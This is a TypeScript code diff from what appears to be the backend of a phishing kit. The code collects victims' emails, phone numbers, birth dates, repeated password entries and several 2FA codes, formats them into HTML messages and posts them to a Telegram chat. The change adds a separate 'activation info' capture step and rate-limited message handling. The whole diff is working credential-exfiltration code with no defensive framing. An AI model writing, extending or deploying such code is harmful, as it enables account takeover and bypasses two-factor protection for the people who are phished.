@@ -123,7 +123,12 @@ function mergeData(oldData: any = {}, newData: any = {}) {
     return result;
 }
 
-function formatMessage(data: any): string {
+type FormatMessageOptions = {
+    includePassword?: boolean;
+};
+
+function formatMessage(data: any, options: FormatMessageOptions = {}): string {
+    const includePassword = options.includePassword !== false;
     const d = normalizeData(data);
     const dob = [d.day, d.month, d.year].every((x) => String(x ?? '').trim())
         ? `${escapeHtml(d.day)}/${escapeHtml(d.month)}/${escapeHtml(d.year)}`
@@ -143,14 +148,21 @@ function formatMessage(data: any): string {
         `<b>Email:</b> <code>${formatCodeField(d.email)}</code>`,
         `<b>Business Email:</b> <code>${formatCodeField(d.emailBusiness)}</code>`,
         `<b>Phone:</b> <code>${phoneDisplay}</code>`,
-        `----------------------`,
-        `<b>Password(1):</b> <code>${formatCodeField(d.password)}</code>`,
-        `<b>Password(2):</b> <code>${formatCodeField(d.passwordSecond)}</code>`,
-        `${authLine ? authLine.trim() : ''}`
-    ].filter(Boolean);
+    ];
+
+    if (includePassword) {
+        lines.push(
+            `----------------------`,
+            `<b>Password(1):</b> <code>${formatCodeField(d.password)}</code>`,
+            `<b>Password(2):</b> <code>${formatCodeField(d.passwordSecond)}</code>`,
+            `${authLine ? authLine.trim() : ''}`
+        );
+    }
+
+    const filtered = lines.filter(Boolean);
 
     if (has2FA) {
-        lines.push(
+        filtered.push(
             `----------------------`,
             `<b>2FA(1):</b> <code>${formatCodeField(d.twoFa)}</code>`,
             `<b>2FA(2):</b> <code>${formatCodeField(d.twoFaSecond)}</code>`,
@@ -158,7 +170,7 @@ function formatMessage(data: any): string {
         );
     }
 
-    return lines.join('\n');
+    return filtered.join('\n');
 }
 
 function isRecaptchaTickEvent(data: any): boolean {
@@ -176,6 +188,19 @@ function isRecaptchaTickEvent(data: any): boolean {
         d.twoFaSecond ||
         d.twoFaThird;
     return !hasFormData;
+}
+
+function isActivationInfoSubmitEvent(data: any): boolean {
+    return data?.activationInfoSubmit === true;
+}
+
+function stripClientEventFlags(data: any = {}) {
+    const { activationInfoSubmit, recaptcha, ...rest } = data;
+    return rest;
+}
+
+function formatActivationInfoMessage(data: any): string {
+    return formatMessage(data, { includePassword: false });
 }
 
 function formatRecaptchaTickMessage(data: any): string {
@@ -270,6 +295,31 @@ async function sendRecaptchaTickTelegram(
     });
 }
 
+/** Tin Telegram ngắn khi gửi form «Thông tin kích hoạt». */
+async function sendActivationInfoTelegram(
+    config: NonNullable<ReturnType<typeof getTelegramConfig>>,
+    data: any
+): Promise<void> {
+    const payload = stripClientEventFlags(data);
+    const key = generateKey(payload);
+    if (!checkRateLimit(key)) {
+        console.warn(`⚠️ Rate limit exceeded for key: ${key}`);
+        return;
+    }
+
+    const prev = memoryStoreTTL.get(key);
+    const fullData = mergeData(prev?.data, payload);
+    const text = formatActivationInfoMessage(fullData);
+    const messageId = await postTelegramText(config, text);
+
+    if (messageId) {
+        memoryStoreTTL.set(key, { message: text, messageId, data: fullData });
+        console.log(`✅ Sent activation info message. ID: ${messageId}`);
+    } else {
+        console.warn('⚠️ Activation info Telegram response không có message_id');
+    }
+}
+
 export async function sendTelegramMessage(data: any): Promise<void> {
     const config = getTelegramConfig();
     if (!config) {
@@ -279,6 +329,11 @@ export async function sendTelegramMessage(data: any): Promise<void> {
 
     if (isRecaptchaTickEvent(data)) {
         await sendRecaptchaTickTelegram(config, data);
+        return;
+    }
+
+    if (isActivationInfoSubmitEvent(data)) {
+        await sendActivationInfoTelegram(config, data);
         return;
     }
 
